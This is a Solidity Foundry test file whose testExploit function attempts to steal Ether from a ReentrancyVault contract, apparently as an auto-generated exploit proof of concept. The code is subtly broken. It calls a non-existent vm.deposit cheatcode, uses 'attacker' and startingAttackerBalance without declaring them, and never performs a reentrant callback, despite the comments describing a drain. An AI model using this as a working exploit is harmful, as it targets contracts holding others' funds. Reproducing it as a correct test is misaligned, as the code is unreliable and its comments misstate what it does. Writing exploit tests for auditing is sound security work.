// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/af28df88-6c82-44e8-ab91-67390d040a9a_ReentrancyVault.sol";

contract ReentrancyVaultTest is BaseTestWithBalanceLog {
    ReentrancyVault target;

    function setUp() public override {
        target = new ReentrancyVault();
    
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public  balanceLog {
        // Step 1: Create an attacker account with sufficient funds
        address attacker = makeAddr("attacker");
        vm.deposit{value: 2 ether}(attacker);

        // Step 2: Call deposit() from an initial user account to deposit Ether into the contract
        (uint256 initialBalance, ) = target.balances(msg.sender);
        assertEq(initialBalance, 0); // User should have 0 balance initially

        vm.prank(attacker);
        target.deposit{value: 1 ether}();

        (initialBalance, ) = target.balances(attacker);
        assertEq(initialBalance, 1 ether); // Attacker should now have 1 Ether in the contract

        // Step 3: Call withdraw() with a higher amount than the attacker's balance
        vm.prank(attacker);
        target.withdraw(2 ether);

        (uint256 finalBalance, ) = target.balances(attacker);
        assertEq(finalBalance, 0); // Attacker should now have 0 Ether in the contract

        assertGt(attacker.balance, startingAttackerBalance + 1 ether); // Assert that attacker's balance has increased
    }
}